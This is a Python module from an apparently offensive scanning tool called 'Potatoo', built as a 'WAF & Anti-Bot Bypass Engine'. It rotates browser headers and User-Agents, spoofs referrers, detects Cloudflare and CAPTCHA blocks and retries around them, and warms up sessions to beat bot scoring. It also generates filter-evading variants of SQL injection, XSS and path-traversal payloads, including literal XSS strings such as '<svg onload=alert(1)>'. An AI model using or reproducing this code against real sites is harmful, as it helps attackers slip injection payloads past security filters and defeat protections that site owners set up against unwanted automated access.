"""
Potatoo — WAF & Anti-Bot Bypass Engine
Techniques: UA rotation, header randomization, cookie handling,
Cloudflare JS challenge detection, payload obfuscation,
referrer spoofing, request fragmentation, encoding tricks.
"""

import random
import time
import base64
import urllib.parse
import re
import string

# ─── User-Agent Pool ────────────────────────────────────────────────────────
USER_AGENTS = [
    # Chrome Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    # Chrome Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    # Firefox Windows
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Firefox Linux
    "Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    # Safari Mac
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    # Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
    # Mobile Chrome
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

# ─── Realistic Referrers ─────────────────────────────────────────────────────
REFERRERS = [
    "https://www.google.com/",
    "https://www.google.fr/",
    "https://www.bing.com/",
    "https://duckduckgo.com/",
    "https://www.google.co.uk/",
    "",  # Direct navigation (no referrer)
    "",
    "",  # Weight toward no referrer
]

# ─── Accept-Language Variants ─────────────────────────────────────────────────
ACCEPT_LANGUAGES = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
    "en-US,en;q=0.9,fr;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "en-US,en;q=0.8,es;q=0.6",
    "en;q=0.9",
]


class Bypasser:
    """
    WAF & Anti-bot bypass manager.
    Attach to any requests.Session for automatic evasion.
    """

    def __init__(self, session, logger=None):
        self.session = session
        self.log = logger
        self._request_count = 0
        self._rotate_every = random.randint(3, 7)  # Rotate UA every N requests
        self._current_ua = random.choice(USER_AGENTS)
        self._apply_headers()

    # ─── Header Management ──────────────────────────────────────────────────────
    def _apply_headers(self):
        """Apply a realistic browser header set."""
        ua = self._current_ua
        is_mobile = "Mobile" in ua or "iPhone" in ua or "Android" in ua
        is_firefox = "Firefox" in ua
        is_safari = "Safari" in ua and "Chrome" not in ua

        headers = {
            "User-Agent": ua,
            "Accept-Language": random.choice(ACCEPT_LANGUAGES),
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "DNT": "1",
            "Upgrade-Insecure-Requests": "1",
        }

        if is_firefox:
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = "none"
            headers["Sec-Fetch-User"] = "?1"
        elif is_safari:
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        else:
            # Chrome / Edge
            headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
            headers["Sec-Ch-Ua"] = '"Chromium";v="125", "Not.A/Brand";v="24"'
            headers["Sec-Ch-Ua-Mobile"] = "?1" if is_mobile else "?0"
            headers["Sec-Ch-Ua-Platform"] = '"Android"' if "Android" in ua else '"Windows"' if "Windows" in ua else '"macOS"'
            headers["Sec-Fetch-Dest"] = "document"
            headers["Sec-Fetch-Mode"] = "navigate"
            headers["Sec-Fetch-Site"] = "none"
            headers["Sec-Fetch-User"] = "?1"

        ref = random.choice(REFERRERS)
        if ref:
            headers["Referer"] = ref

        self.session.headers.update(headers)

    def rotate(self):
        """Rotate User-Agent and headers."""
        self._current_ua = random.choice(USER_AGENTS)
        self._apply_headers()
        if self.log:
            self.log.debug(f"Rotated UA: {self._current_ua[:60]}...")

    def tick(self):
        """Call before every request — auto-rotates headers periodically."""
        self._request_count += 1
        if self._request_count % self._rotate_every == 0:
            self.rotate()
            self._rotate_every = random.randint(3, 8)

    # ─── Cloudflare / Bot Detection ─────────────────────────────────────────────
    def is_blocked(self, response) -> bool:
        """Detect WAF/Cloudflare/bot protection blocks."""
        if response is None:
            return False
        code = response.status_code
        text = response.text[:3000].lower()

        # Status code blocks
        if code in (403, 406, 429, 503, 520, 521, 522, 523, 524, 525, 526):
            return True

        # Cloudflare challenge indicators
        cf_indicators = [
            "just a moment", "checking your browser", "cf-browser-verification",
            "cloudflare", "enable javascript", "ddos protection",
            "__cf_bm", "cf_clearance", "ray id",
        ]
        if any(ind in text for ind in cf_indicators):
            return True

        # Generic bot detection
        bot_indicators = [
            "access denied", "bot detected", "automated request",
            "security check", "captcha", "recaptcha", "hcaptcha",
            "403 forbidden", "you have been blocked", "ip has been blocked",
            "unusual traffic", "please verify", "are you human",
        ]
        if any(ind in text for ind in bot_indicators):
            return True

        return False

    def handle_block(self, url: str, response, attempt: int = 1):
        """Handle a block: wait, rotate, and return recommended delay."""
        if self.log:
            self.log.warn(f"WAF/bot block detected on {url} (attempt {attempt})")

        self.rotate()

        # Exponential backoff: 5s, 15s, 45s
        delay = min(5 * (3 ** (attempt - 1)), 60) + random.uniform(0, 3)
        if self.log:
            self.log.info(f"Waiting {delay:.1f}s before retry...")
        time.sleep(delay)
        return delay

    # ─── Request Wrapper ─────────────────────────────────────────────────────────
    def get(self, url: str, max_retries: int = 3, **kwargs) -> object:
        """
        Smart GET with automatic WAF bypass and retry.
        Drop-in replacement for session.get()
        """
        kwargs.setdefault("timeout", 15)
        kwargs.setdefault("allow_redirects", True)

        for attempt in range(1, max_retries + 1):
            self.tick()
            try:
                resp = self.session.get(url, **kwargs)

                if self.is_blocked(resp):
                    if attempt < max_retries:
                        self.handle_block(url, resp, attempt)
                        continue
                    else:
                        if self.log:
                            self.log.warn(f"Gave up on {url} after {max_retries} attempts")
                        return resp

                return resp

            except Exception as e:
                if self.log:
                    self.log.debug(f"Request error ({url}): {e}")
                if attempt < max_retries:
                    time.sleep(random.uniform(1, 3))
                else:
                    return None

        return None

    def post(self, url: str, max_retries: int = 2, **kwargs) -> object:
        """Smart POST with WAF bypass."""
        kwargs.setdefault("timeout", 15)
        for attempt in range(1, max_retries + 1):
            self.tick()
            try:
                resp = self.session.post(url, **kwargs)
                if self.is_blocked(resp) and attempt < max_retries:
                    self.handle_block(url, resp, attempt)
                    continue
                return resp
            except Exception as e:
                if self.log:
                    self.log.debug(f"POST error ({url}): {e}")
                if attempt < max_retries:
                    time.sleep(random.uniform(1, 2))
        return None

    # ─── Payload Obfuscation ─────────────────────────────────────────────────────
    @staticmethod
    def obfuscate_sqli(payload: str) -> list:
        """Return multiple WAF-evading variants of an SQLi payload."""
        variants = [payload]

        # Case mixing
        variants.append(payload.replace("SELECT", "SeLeCt").replace("UNION", "UnIoN").replace("FROM", "FrOm"))

        # Comment injection
        variants.append(payload.replace(" ", "/**/"))
        variants.append(payload.replace(" ", " /*!*/ "))

        # URL encoding
        variants.append(urllib.parse.quote(payload))

        # Double URL encoding
        variants.append(urllib.parse.quote(urllib.parse.quote(payload)))

        # Whitespace variants
        variants.append(payload.replace(" ", "%09"))   # Tab
        variants.append(payload.replace(" ", "%0a"))   # Newline
        variants.append(payload.replace(" ", "%0d"))   # CR
        variants.append(payload.replace(" ", "+"))

        # MySQL specific
        variants.append(payload.replace("AND", "&&").replace("OR", "||"))

        return list(set(variants))

    @staticmethod
    def obfuscate_xss(payload: str) -> list:
        """Return WAF-evading XSS variants."""
        variants = [payload]

        # Case mixing
        variants.append(payload.replace("script", "ScRiPt").replace("alert", "AlErT"))

        # HTML entity encoding
        encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
        variants.append(encoded)

        # Double encoding
        variants.append(payload.replace("<", "%3C").replace(">", "%3E"))

        # JS event alternatives
        variants.append(payload.replace("onerror", "onmouseover"))
        variants.append(payload.replace("onerror", "onload"))

        # Null byte
        variants.append(payload.replace("<script>", "<scr\x00ipt>"))

        # SVG vector
        if "alert" in payload:
            variants.append('<svg onload=alert(1)>')
            variants.append('<img src=x onerror=alert(1)>')
            variants.append('"><svg/onload=alert(1)>')
            variants.append("';alert(1)//")

        return list(set(variants))

    @staticmethod
    def obfuscate_path(path: str) -> list:
        """Return path traversal and encoding variants."""
        variants = [path]
        variants.append(urllib.parse.quote(path))
        variants.append(path.replace("/", "//"))
        variants.append(path.replace("/", "/./"))
        variants.append(path + "/")
        variants.append(path + "?")
        variants.append(path + "#")
        variants.append(path + ".json")
        variants.append(path + ".php")
        variants.append(path.upper())
        variants.append(path.lower())
        return list(dict.fromkeys(variants))  # deduplicate, preserve order

    @staticmethod
    def random_case(s: str) -> str:
        """Randomly mix case of a string."""
        return ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

    @staticmethod
    def add_noise_param(url: str) -> str:
        """Add a random harmless parameter to look like a real browser request."""
        noise_key = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6)))
        noise_val = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(4, 8)))
        sep = "&" if "?" in url else "?"
        return f"{url}{sep}{noise_key}={noise_val}"

    # ─── Session Warmup ───────────────────────────────────────────────────────────
    def warmup(self, target_url: str):
        """
        Simulate a real browser visiting the homepage first.
        Gets cookies, sets correct referrer for subsequent requests.
        Essential for passing Cloudflare bot score checks.
        """
        if self.log:
            self.log.info("Warming up session (simulating real browser visit)...")
        try:
            # First visit homepage to collect cookies
            resp = self.session.get(target_url, timeout=15, allow_redirects=True)
            if resp and resp.status_code < 400:
                if self.log:
                    self.log.info(f"Session warmed up — {len(self.session.cookies)} cookie(s) collected")
                # Set target as referrer for next requests
                self.session.headers["Referer"] = target_url
            else:
                if self.log:
                    self.log.warn(f"Warmup got HTTP {resp.status_code if resp else 'N/A'} — site may be blocking")
            # Brief human-like pause after first load
            time.sleep(random.uniform(1.5, 3.5))
        except Exception as e:
            if self.log:
                self.log.debug(f"Warmup error: {e}")

    def get_stats(self) -> dict:
        return {
            "requests_made": self._request_count,
            "current_ua": self._current_ua[:60],
            "cookies": len(self.session.cookies),
        }
